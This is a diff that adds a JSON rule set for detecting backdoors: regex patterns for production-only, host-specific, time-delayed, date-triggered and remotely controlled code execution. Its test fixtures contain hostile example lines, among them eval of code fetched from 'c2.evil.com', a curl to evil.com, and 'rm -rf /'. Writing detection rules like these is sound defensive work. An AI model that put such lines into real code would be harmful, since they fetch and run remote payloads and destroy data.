@@ -1,0 +1,102 @@
+{
+  "$schema": "../rule-schema.json",
+  "category": "Backdoor Detection",
+  "rules": [
+    {
+      "id": "BACK-001",
+      "title": "Production environment conditional execution",
+      "description": "Code that only activates in production environments may be a dormant backdoor.",
+      "severity": "high",
+      "pattern": "(?i)(NODE_ENV|ENVIRONMENT|ENV|RAILS_ENV|APP_ENV)\\s*[=!]==?\\s*['\"]production['\"]\\s*[)&|].*?(eval|exec|spawn|fetch|request|http|curl|child_process)",
+      "file_extensions": ["js", "ts", "mjs", "cjs", "py", "sh"],
+      "remediation": "Review environment-conditional code for hidden functionality.",
+      "test_cases": {
+        "should_match": [
+          "if (process.env.NODE_ENV === 'production') { eval(payload) }",
+          "NODE_ENV === \"production\") && exec('curl http://evil.com')"
+        ],
+        "should_not_match": [
+          "if (process.env.NODE_ENV === 'production') { console.log('prod') }",
+          "const env = 'production'"
+        ]
+      }
+    },
+    {
+      "id": "BACK-002",
+      "title": "Conditional backdoor with hostname/user check",
+      "description": "Code that activates only for specific hostnames or users may be a targeted backdoor.",
+      "severity": "high",
+      "pattern": "(os\\.hostname|process\\.env\\.USER|process\\.env\\.HOSTNAME|os\\.getlogin|getpass\\.getuser|socket\\.gethostname)\\s*\\(\\)\\s*[=!]==?\\s*['\"]",
+      "file_extensions": ["js", "ts", "mjs", "cjs", "py"],
+      "remediation": "Remove host or user-specific conditional code paths.",
+      "test_cases": {
+        "should_match": [
+          "if (os.hostname() === 'target-server')",
+          "if (getpass.getuser() == 'admin')",
+          "process.env.HOSTNAME() !== 'safe-host'"
+        ],
+        "should_not_match": [
+          "const host = os.hostname()",
+          "console.log(process.env.USER)"
+        ]
+      }
+    },
+    {
+      "id": "BACK-003",
+      "title": "Time-delayed execution",
+      "description": "Long setTimeout/setInterval delays may be used to evade sandbox testing.",
+      "severity": "medium",
+      "pattern": "\\b(setTimeout|setInterval)\\s*\\([^,]+,\\s*[0-9]{5,}\\)",
+      "file_extensions": ["js", "ts", "mjs", "cjs"],
+      "remediation": "Review long-delay timers for hidden functionality.",
+      "test_cases": {
+        "should_match": [
+          "setTimeout(activate, 86400000)",
+          "setInterval(beacon, 3600000)"
+        ],
+        "should_not_match": [
+          "setTimeout(callback, 1000)",
+          "setTimeout(fn, 100)"
+        ]
+      }
+    },
+    {
+      "id": "BACK-004",
+      "title": "Date-triggered execution",
+      "description": "Code that activates after a specific date may be a time bomb.",
+      "severity": "high",
+      "pattern": "(?i)(new\\s+Date|Date\\.now|time\\.time|datetime).*?(>|>=|after)\\s*.*?(202[5-9]|20[3-9][0-9]).*?(eval|exec|spawn|fetch|request|child_process)",
+      "file_extensions": ["js", "ts", "mjs", "cjs", "py"],
+      "remediation": "Remove date-conditional code execution patterns.",
+      "test_cases": {
+        "should_match": [
+          "if (new Date() > new Date('2026-06-01')) { eval(payload) }",
+          "if (Date.now() >= 2027) { exec('rm -rf /') }"
+        ],
+        "should_not_match": [
+          "const now = new Date()",
+          "if (Date.now() > 1000) { console.log('ok') }"
+        ]
+      }
+    },
+    {
+      "id": "BACK-005",
+      "title": "Network-triggered activation",
+      "description": "Code that fetches configuration from a remote server to decide what to execute may be a remotely-controlled backdoor.",
+      "severity": "critical",
+      "pattern": "(?i)(fetch|axios|request|http\\.get|urllib|requests\\.get)\\s*\\([^)]+\\)[^;]*\\.then\\s*\\([^)]*\\b(eval|exec|Function|spawn|child_process)",
+      "file_extensions": ["js", "ts", "mjs", "cjs", "py"],
+      "remediation": "Never execute code fetched from remote servers.",
+      "test_cases": {
+        "should_match": [
+          "fetch('https://c2.evil.com/cmd').then(r => eval(r.text()))",
+          "axios('https://evil.com/payload').then(data => exec(data))"
+        ],
+        "should_not_match": [
+          "fetch('https://api.com/data').then(r => r.json())",
+          "axios.get('/api/users').then(res => setUsers(res.data))"
+        ]
+      }
+    }
+  ]
+}
